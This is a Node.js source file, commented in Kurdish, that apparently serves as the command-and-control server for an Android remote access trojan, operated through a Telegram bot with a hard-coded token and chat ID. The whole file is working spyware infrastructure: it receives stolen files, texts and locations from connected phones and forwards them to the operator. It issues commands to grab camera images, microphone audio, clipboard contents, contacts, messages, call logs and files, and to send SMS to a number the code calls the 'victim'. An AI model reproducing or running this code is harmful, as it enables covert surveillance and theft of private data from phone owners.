const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

// --- ڕێکخستنی زانیارییەکان ---
const token = '8460227710:AAG58yMp1hEahBh6APqif93ljQvarx4egQo'
const id = '5578405082'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

// بەشی سەرەکی سایتەکە
app.get('/', function (req, res) {
    res.send('<h1 align="center">سێرڤەری حەشاشە بە سەرکەوتوویی کار دەکات 🚀</h1>')
})

// وەرگرتنی فایل
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• فایلێک لە مۆبایلی <b>${req.headers.model}</b> گەیشت`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/octet-stream',
        })
    res.send('')
})

// وەرگرتنی تێکست یان نامە
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• زانیاری نوێ لە مۆبایلی <b>${req.headers.model}</b>\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

// وەرگرتنی لوکەیشن
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• شوێنی مۆبایلی <b>${req.headers.model}</b>`, {parse_mode: "HTML"})
    res.send('')
})

// کاتی پەیوەستبوونی مۆبایلێکی نوێ
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    
    appBot.sendMessage(id,
        `°• مۆبایلێکی نوێ پەیوەست بوو 🔥\n\n` +
        `• مۆدێل: <b>${model}</b>\n` +
        `• شەحن: <b>${battery}%</b>\n` +
        `• ئەندرۆید: <b>${version}</b>\n` +
        `• ڕووناکی شاشە: <b>${brightness}</b>\n` +
        `• کۆمپانیا: <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )

    ws.on('close', function () {
        appBot.sendMessage(id, `°• مۆبایلەکە پچڕا (Offline): <b>${model}</b>`, {parse_mode: "HTML"})
        appClients.delete(ws.uuid)
    })
})

// فەرمانەکانی بۆتەکە
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        // لێرەدا وەڵامی فەرمانەکان دەداتەوە (نوسینەکانم گۆڕی بۆ کوردی)
        if (message.reply_to_message.text.includes('ژمارەی قوربانی بنوسە')) {
            currentNumber = message.text
            appBot.sendMessage(id, '°• زۆر باشە، ئێستا ئەو نامەیە بنوسە کە دەتەوێت بینێریت...', {reply_markup: {force_reply: true}})
        }
        
        if (message.reply_to_message.text.includes('ئەو نامەیە بنوسە کە دەتەوێت بینێریت')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            appBot.sendMessage(id, '°• فەرمانەکە ناردرا، کەمێکی تر وەڵامت بۆ دێتەوە...', {
                reply_markup: { keyboard: [["مۆبایلە پەیوەستەکان"], ["جێبەجێکردنی فەرمان"]], resize_keyboard: true }
            })
        }
        
        // وەرگرتنی فایل بەپێی مەسار (Path)
        if (message.reply_to_message.text.includes('مەساری ئەو فایلە بنوسە کە دەتەوێت')) {
            const path = message.text
            appSocket.clients.forEach(function (ws) {
                if (ws.uuid == currentUuid) ws.send(`file:${path}`)
            });
            appBot.sendMessage(id, '°• چاوەڕوان بە بۆ وەرگرتنی فایل...', {
                reply_markup: { keyboard: [["مۆبایلە پەیوەستەکان"], ["جێبەجێکردنی فەرمان"]], resize_keyboard: true }
            })
        }
    }

    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• بەخێربێیت بۆ سێرڤەری تایبەتی حەشاشە 🦁\n\n' +
                '• لێرەوە دەتوانی کۆنترۆڵی ئەو مۆبایلانە بکەیت کە ئەپەکەیان تێدایە.\n' +
                '• کاتێک مۆبایلێک دێتە خەت، لێرە ئاگادارت دەکەمەوە.',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["مۆبایلە پەیوەستەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        
        if (message.text == 'مۆبایلە پەیوەستەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• هیچ مۆبایلێک پەیوەست نییە لە ئێستادا!')
            } else {
                let text = '°• لیستی مۆبایلە ئۆنلاینەکان:\n\n'
                appClients.forEach(function (value) {
                    text += `• مۆدێل: <b>${value.model}</b> | شەحن: <b>${value.battery}%</b>\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }

        if (message.text == 'جێبەجێکردنی فەرمان') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• هیچ مۆبایلێک نییە بۆ فەرمان دان!')
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key) {
                    deviceListKeyboard.push([{ text: value.model, callback_data: 'device:' + key }])
                })
                appBot.sendMessage(id, '°• مۆبایلێک هەڵبژێرە بۆ کۆنترۆڵ کردن:', {
                    "reply_markup": { "inline_keyboard": deviceListKeyboard }
                })
            }
        }
    }
})

// دوگمە ناوەکییەکان (Inline Buttons)
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const command = data.split(':')[0]
    const uuid = data.split(':')[1]

    if (command == 'device') {
        appBot.editMessageText(`°• فەرمانێک هەڵبژێرە بۆ مۆبایلی: <b>${appClients.get(uuid).model}</b>`, {
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{text: 'لیستی ئەپەکان', callback_data: `apps:${uuid}`}, {text: 'زانیاری مۆبایل', callback_data: `device_info:${uuid}`}],
                    [{text: 'ڕاکێشانی فایل', callback_data: `file:${uuid}`}, {text: 'سڕینەوەی فایل', callback_data: `delete_file:${uuid}`}],
                    [{text: 'مایکرۆفۆن (دەنگ)', callback_data: `microphone:${uuid}`}, {text: 'کۆپی (Clipboard)', callback_data: `clipboard:${uuid}`}],
                    [{text: 'کامێرای پێشەوە', callback_data: `camera_main:${uuid}`}, {text: 'کامێرای سێڵفی', callback_data: `camera_selfie:${uuid}`}],
                    [{text: 'لوکەیشن (شوێن)', callback_data: `location:${uuid}`}, {text: 'ناردنی نامە', callback_data: `send_message:${uuid}`}]
                ]
            },
            parse_mode: "HTML"
        })
    }
    
    // جێبەجێکردنی فەرمانەکان (نموونە بۆ کامێرا و لیستەکان)
    if (['apps', 'device_info', 'clipboard', 'camera_main', 'camera_selfie', 'location', 'contacts', 'messages', 'calls'].includes(command)) {
        appSocket.clients.forEach(function (ws) {
            if (ws.uuid == uuid) ws.send(command);
        });
        appBot.sendMessage(id, '°• داواکارییەکەت نێردرا، کەمێکی تر ئەنجامەکە لێرە دەبینیت...')
    }
    
    if (command == 'file') {
        appBot.sendMessage(id, '°• مەساری ئەو فایلە بنوسە کە دەتەوێت (بۆ نموونە: DCIM/Camera)', {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    
    if (command == 'send_message') {
        appBot.sendMessage(id, '°• ژمارەی قوربانی بنوسە (بە سفری سەرەتاوە):', {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
});

// هێشتنەوەی سێرڤەر بە زیندوویی
setInterval(function () {
    appSocket.clients.forEach(function (ws) { ws.send('ping') });
    axios.get(address).catch(e => {});
}, 5000)

// پۆرتی گونجاو بۆ Koyeb
appServer.listen(process.env.PORT || 8000);
